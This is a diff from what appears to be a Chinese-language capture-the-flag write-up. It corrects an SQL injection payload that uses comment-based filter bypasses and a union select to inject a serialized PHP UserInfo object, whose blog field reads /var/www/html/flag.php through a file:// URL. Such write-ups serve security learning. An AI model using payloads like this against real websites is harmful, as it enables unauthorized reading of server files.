@@ -91,7 +91,7 @@ O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:2;s:4:"blog";s:28:"file://var/w
 将反序列化字符串放入url中构造payload：
 
 ```
-no=0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:2;s:4:"blog";s:28:"file://var/www/html/flag.php";}'#
+no=0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:2;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#
 ```
 
 
